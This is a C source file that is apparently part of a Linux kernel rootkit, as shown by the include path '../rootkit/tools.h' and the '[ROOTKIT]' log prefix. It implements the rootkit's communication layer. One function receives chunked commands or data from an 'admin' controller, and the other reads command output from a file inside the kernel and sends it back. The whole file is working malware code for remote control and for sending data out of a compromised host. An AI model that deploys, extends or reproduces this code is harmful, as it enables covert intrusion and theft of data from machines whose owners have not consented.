#include "communication.h"
#include "../rootkit/tools.h"

int receive_data(char *buffer, uint32_t data_stream_id, uint64_t data_size, char *data) {
    for (int i = 0; i <= (int)(data_size/(BUFFER_SIZE-5)); i++ ) {
            
        if (receive(buffer, BUFFER_SIZE) < 0) {
            return -1;
        }
        if (buffer[0] != COMMAND_SENDINGFROMADMIN) {
            return -1;
        } if (i == data_size/(BUFFER_SIZE-5)) {
            pr_info("[ROOTKIT] Receiving LAST chunk of data (%llu/%i)\n", (unsigned long long)(data_size/(BUFFER_SIZE-5)), i*(BUFFER_SIZE - 5));
            decapsulate_transfer_data_cmd(buffer, &data_stream_id, data, i*(BUFFER_SIZE - 5)); // TODO: make fit exacly
        } else {
            pr_info("[ROOTKIT] Receiving chunk of data (%llu/%i)\n", (unsigned long long)(data_size/(BUFFER_SIZE-5)), i);
            decapsulate_transfer_data_cmd(buffer, &data_stream_id, data, i*(BUFFER_SIZE - 5));
        }
        pr_info("[ROOTKIT] Received data: %s\n", data);

        encapsulate_transfer_cmd(buffer, COMMAND_RECEIVINGFROMCLIENT, data_stream_id);
        if (send(buffer, BUFFER_SIZE) < 0) {
            return -1;
        }
    }

    if (receive(buffer, BUFFER_SIZE) < 0) {
        return -1;
    } else if (buffer[0] != STATUS_FROMADMINSENDED){
        return -1;
    }
    return 0;
}

int send_output_from_file(char *buffer, char *file_buffer, int file_size, char *output_file, uint32_t data_stream_id, char *data) {
    memset(buffer, 0, BUFFER_SIZE);
    memset(file_buffer, 0, BUFFER_SIZE-5);
    if (file_size > 0) {
        struct file *pipe_file;
        pipe_file = filp_open(output_file, O_RDONLY, 0);
        for (int i = 0; i <= (int)(file_size/(BUFFER_SIZE-5)); i++) {
            if (i == (int)(file_size/(BUFFER_SIZE-5))){
                memset(buffer, 0, BUFFER_SIZE);
                memset(file_buffer, 0, BUFFER_SIZE-5);
            }

            // read chunk
            pipe_file->f_pos = (i*(BUFFER_SIZE-5));
            kernel_read(pipe_file, file_buffer, (BUFFER_SIZE-5), &pipe_file->f_pos);

            encapsulate_transfer_data_cmd(buffer, COMMAND_SENDINGFROMCLIENT, data_stream_id, file_buffer);
            pr_info("[ROOTKIT] Sending ouput from byte %d to %d\n", (i*(BUFFER_SIZE-5)), (i*(BUFFER_SIZE-5))+(BUFFER_SIZE-5));
            if (send(buffer, BUFFER_SIZE) < 0) {
                return -1;
            }
            
        }
        // read_file(file_buffer, output_file, (BUFFER_SIZE-5), i*(BUFFER_SIZE-5));
        filp_close(pipe_file, NULL);
    } else {
        if (file_size == 0) {
            file_buffer[0] = STATUS_NOOUTPUT;
        } else if (file_size == -1) {
            file_buffer[0] = STATUS_NOTFOUND;
        }
        encapsulate_transfer_data_cmd(buffer, COMMAND_SENDINGFROMCLIENT, data_stream_id, file_buffer);
        pr_info("[ROOTKIT] Sending empty output\n");
        if (send(buffer, BUFFER_SIZE) < 0) {
            return -1;
        }
    }


    memset(buffer, 0, BUFFER_SIZE);
    encapsulate_transfer_cmd(buffer, STATUS_FROMCLIENTSENDED, data_stream_id);
    if (send(buffer, BUFFER_SIZE) < 0) {
        return -1;
    }

    return 0;
}